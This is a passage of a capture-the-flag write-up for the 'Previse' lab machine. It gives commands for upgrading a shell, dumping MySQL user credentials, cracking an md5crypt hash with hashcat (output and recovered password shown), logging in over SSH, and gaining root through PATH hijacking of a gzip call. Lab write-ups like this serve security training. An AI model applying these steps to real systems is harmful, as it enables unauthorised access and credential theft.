* spawn pty - 
	python -c "import pty; pty.spawn('/bin/bash')"
	export TERM=xterm
* You get a proper terminal.
* In source code review, we did get a file called *'config.php'*. 	Here we get credentials for mysql. Try connecting to mysql while on the shell using - musql -u \<username> -p
* Enter passwd and you get access to databases. 
* Do - 
	* show databases;
	* use \<database>
	* show tables
	* select * from \<table>
* You get access to user creds
* Password is an hash, using hashcat to decrypt the password (visit [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) for more info) -
```bash
hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
                                                  
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
Time.Started.....: Mon Oct 11 16:52:18 2021 (25 mins, 14 secs)
Time.Estimated...: Mon Oct 11 17:17:32 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     4690 H/s (12.47ms) @ Accel:32 Loops:500 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7413376/14344385 (51.68%)
Rejected.........: 0/7413376 (0.00%)
Restore.Point....: 7413248/14344385 (51.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Candidates.#1....: ilovecody98 -> ilovecloandlivey

Started: Mon Oct 11 16:50:35 2021
Stopped: Mon Oct 11 17:17:33 2021
```

* login using ssh - ssh \<username>@\<machine-ip>
* Enter the decrypted password
* you get logged in. Browse around to get user flag

*Previlege Escalation - *

* goto linpeas.sh and check methodology
* Run Linpeas and search for something - I found some files in Interesting writable files section - /opt/scripts
* In that you will find an sh file with gzip as command. 
* Edit PATH variable to current working directory - export PATH=\$(pwd):$PATH
* Make a file with name gzip and make it executable using chmod 777. Add /bin/bash to it. Since we have root previleges for this directory we can enter into root using this exe
* Execute the sh and you will enter into root. Capture root flags and You have successfully pwned PREVISE 